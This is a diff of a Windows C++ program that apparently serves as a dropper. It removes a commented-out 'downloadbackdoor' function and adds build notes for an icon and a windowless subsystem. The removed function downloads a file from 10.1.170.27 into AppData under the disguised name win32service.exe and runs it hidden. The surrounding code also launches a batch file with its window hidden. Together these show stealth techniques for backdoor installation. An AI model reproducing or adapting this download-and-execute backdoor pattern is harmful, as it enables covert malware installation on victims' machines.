@@ -54,25 +54,8 @@ endlocal
     ShellExecute(NULL, L"open", wideBatFilePath.c_str(), NULL, NULL, SW_HIDE);
 }
 
-// void downloadbackdoor()
-// {
-//     char* appDataCStr;
-//     size_t len;
-//     _dupenv_s(&appDataCStr, &len, "AppData");
-//     std::string appData = appDataCStr;
-//     free(appDataCStr);
-//     std::string filePath = appData + "\\Windows Service\\";
-//     std::filesystem::create_directories(filePath);
-//     string URL = "http://10.1.170.27:8000/hello.cpp";
-//     string Backdoorpath = filePath + "win32service.exe";
-//     wstring tempUrl = wstring(URL.begin(), URL.end());
-//     wstring tempBackdoorpath = wstring(Backdoorpath.begin(), Backdoorpath.end());
-//     LPCWSTR url = tempUrl.c_str();
-//     LPCWSTR backdoorpath = tempBackdoorpath.c_str();
-//     if (S_OK == URLDownloadToFile(NULL, url, backdoorpath, 0, NULL))
-//         ShellExecute(NULL, L"open", backdoorpath, NULL, NULL, SW_HIDE); // Use SW_HIDE to hide the window
-// }
-
+// for icon : project(right click) -> Add -> Resource -> Icon -> Import -> select icon file
+// project -> properties -> Linker -> System -> SubSystem -> "Windows (/SUBSYSTEM:WINDOWS)"
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     wchar_t exeFilePath[MAX_PATH];
